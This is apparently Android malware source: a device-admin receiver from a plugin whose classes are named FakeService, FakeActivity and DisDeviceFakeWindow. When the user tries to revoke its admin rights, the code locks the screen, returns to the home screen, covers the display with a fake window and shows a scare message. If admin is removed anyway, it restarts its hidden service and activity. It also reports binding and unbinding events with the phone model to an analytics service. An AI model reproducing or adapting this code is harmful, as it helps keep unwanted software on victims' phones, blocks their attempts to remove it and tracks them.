package com.xstd.plugin.binddevice;

import android.R;
import android.app.AlertDialog;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Build;
import android.view.WindowManager;
import com.googl.plugin.x.FakeActivity;
import com.plugin.common.utils.UtilsRuntime;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.DisDeviceFakeWindow;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;
import com.xstd.plugin.service.FakeService;

import java.util.HashMap;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: AM11:15
 * To change this template use File | Settings | File Templates.
 */
public class DeviceBindBRC extends DeviceAdminReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onEnabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(true);
        SettingManager.getInstance().setBindingSuccessCount(SettingManager.getInstance().getBindingSuccessCount() + 1);

        //notify umeng
        HashMap<String, String> log = new HashMap<String, String>();
        log.put("phoneType", Build.MODEL);
        log.put("binding_success_count", String.valueOf(SettingManager.getInstance().getBindingSuccessCount()));
        if (SettingManager.getInstance().getBindingSuccessCount() > 1) {
            log.put("multi_binding_phone", Build.MODEL);
        }
        CommonUtil.umengLog(context, "binding", log);

        Intent i = new Intent();
        i.setAction(FakeService.BIND_SUCCESS_ACTION);
        context.sendBroadcast(i);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(false);

        HashMap<String, String> log = new HashMap<String, String>();
        log.put("phoneType", Build.MODEL);
        CommonUtil.umengLog(context, "unbinding_real", log);

        //立刻启动激活
        CommonUtil.startFakeService(context, "DeviceBindBRC::onDisabled");

        Intent i = new Intent();
        i.setClass(context, FakeActivity.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        context.startActivity(i);
    }

    @Override
    public CharSequence onDisableRequested(final Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisableRequested]] action : " + intent.getAction());

        if (!Config.DEBUG) {
            //notify umeng
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("phoneType", Build.MODEL);
            CommonUtil.umengLog(context, "unbing", log);

            getManager(context).lockNow();
            UtilsRuntime.goHome(context);

            DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
            fakeWindow.show();
        }

        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

    private void showFakeAlertDialog(Context context, String message) {
        AlertDialog dialog = new AlertDialog.Builder(context)
                                 .setTitle(message)
                                 .setIcon(android.R.drawable.ic_dialog_alert)
                                 .setCancelable(true)
                                 .setPositiveButton(android.R.string.cancel, null)
                                 .setNegativeButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                     @Override
                                     public void onClick(DialogInterface dialog, int which) {
                                     }
                                 })
                                 .create();
        dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
        dialog.show();
    }

}
